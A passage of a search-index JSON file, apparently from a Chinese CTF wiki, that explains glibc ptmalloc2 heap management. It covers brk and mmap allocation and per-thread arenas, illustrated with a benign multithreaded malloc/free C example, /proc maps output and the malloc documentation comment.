\n0\n;\n\n\n}\n\n\n\n\n\n\u5728\u6267\u884cmmap\u4e4b\u524d\n\n\n\u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709.so\u6587\u4ef6\u7684mmap\u6bb5\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\nmmap\u540e\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86b7e00000\u5230b7e21000\u7684mmap\u6bb5\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e00000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\nmunmap\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\n\u591a\u7ebf\u7a0b\u652f\u6301\n\n\n\u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728glibc\u7684ptmalloc\u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002\n\n\n/* Per thread arena example. */\n\n\n##include \nstdio.h\n\n\n##include \nstdlib.h\n\n\n##include \npthread.h\n\n\n##include \nunistd.h\n\n\n##include \nsys/types.h\n\n\n\nvoid\n*\n \nthreadFunc\n(\nvoid\n*\n \narg\n)\n \n{\n\n        \nprintf\n(\nBefore malloc in thread 1\n\\n\n);\n\n        \ngetchar\n();\n\n        \nchar\n*\n \naddr\n \n=\n \n(\nchar\n*\n)\n \nmalloc\n(\n1000\n);\n\n        \nprintf\n(\nAfter malloc and before free in thread 1\n\\n\n);\n\n        \ngetchar\n();\n\n        \nfree\n(\naddr\n);\n\n        \nprintf\n(\nAfter free in thread 1\n\\n\n);\n\n        \ngetchar\n();\n\n\n}\n\n\n\nint\n \nmain\n()\n \n{\n\n        \npthread_t\n \nt1\n;\n\n        \nvoid\n*\n \ns\n;\n\n        \nint\n \nret\n;\n\n        \nchar\n*\n \naddr\n;\n\n\n        \nprintf\n(\nWelcome to per thread arena example::%d\n\\n\n,\ngetpid\n());\n\n        \nprintf\n(\nBefore malloc in main thread\n\\n\n);\n\n        \ngetchar\n();\n\n        \naddr\n \n=\n \n(\nchar\n*\n)\n \nmalloc\n(\n1000\n);\n\n        \nprintf\n(\nAfter malloc and before free in main thread\n\\n\n);\n\n        \ngetchar\n();\n\n        \nfree\n(\naddr\n);\n\n        \nprintf\n(\nAfter free in main thread\n\\n\n);\n\n        \ngetchar\n();\n\n        \nret\n \n=\n \npthread_create\n(\nt1\n,\n \nNULL\n,\n \nthreadFunc\n,\n \nNULL\n);\n\n        \nif\n(\nret\n)\n\n        \n{\n\n                \nprintf\n(\nThread creation error\n\\n\n);\n\n                \nreturn\n \n-\n1\n;\n\n        \n}\n\n        \nret\n \n=\n \npthread_join\n(\nt1\n,\n \ns\n);\n\n        \nif\n(\nret\n)\n\n        \n{\n\n                \nprintf\n(\nThread join error\n\\n\n);\n\n                \nreturn\n \n-\n1\n;\n\n        \n}\n\n        \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d\n\uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\nb7e05000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u7b2c\u4e00\u6b21\u7533\u8bf7\u540e\n\uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660emalloc\u7684\u80cc\u540e\u662f\u7528brk\u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e861000\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e860x0806c000-0x0804b000=0x21000\u4e2a\u5b57\u8282\u7684\u5806\u3002\n\u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002\n\u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0brk\u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7e05000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e\n\uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531glibc\u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7e05000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u4e4b\u524d\n\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u6808\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread \n1\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7604000-b7605000 ---p \n00000000\n \n00\n:00 \n0\n \nb7605000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nstack:6594\n]\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u540e\n\uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b1\u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3ammap\u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709132KB\u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3athread arena\u3002\n\n\n\u6ce8\u610f\uff1a\n\n\n\n\n\u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e128KB\u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55arena\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884cmmap\u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002\n\n\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread \n1\n\nAfter malloc and before free in thread \n1\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7500000-b7521000 rw-p \n00000000\n \n00\n:00 \n0\n \nb7521000-b7600000 ---p \n00000000\n \n00\n:00 \n0\n \nb7604000-b7605000 ---p \n00000000\n \n00\n:00 \n0\n \nb7605000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nstack:6594\n]\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e\n\uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread \n1\n\nAfter malloc and before free in thread \n1\n\nAfter free in thread \n1\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7500000-b7521000 rw-p \n00000000\n \n00\n:00 \n0\n \nb7521000-b7600000 ---p \n00000000\n \n00\n:00 \n0\n \nb7604000-b7605000 ---p \n00000000\n \n00\n:00 \n0\n \nb7605000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nstack:6594\n]\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nsploitfun", 
            "title": "\u5806\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_1", 
            "text": "", 
            "title": "\u5806\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_2", 
            "text": "\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58\u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002  \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c   \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c\u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002  \u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002   Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f15\u8d77\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86ptmalloc2\u3002  \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002", 
            "title": "\u4ec0\u4e48\u662f\u5806"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_3", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd   \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528  \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002", 
            "title": "\u5806\u7684\u57fa\u672c\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#malloc", 
            "text": "\u5728 glibc \u7684 malloc.h \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b  /*    malloc(size_t n)    Returns a pointer to a newly allocated chunk of at least n bytes, or null    if no space is available. Additionally, on failure, errno is    set to ENOMEM on ANSI C systems.    If n is zero, malloc returns a minumum-sized chunk. (The minimum    size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit    systems.)  On most systems, size_t is an unsigned type, so calls    with negative arguments are interpreted as requests for huge amounts    of space, which will often fail. The maximum supported value of n    differs across systems, but is in all cases less than the maximum    representable value of a size_t.  */   \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684\u6307\u9488\u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406   \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002  \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f\u65e0\u7b26\u53f7\u6570\uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 \uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002", 
            "title": "malloc"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#free", 
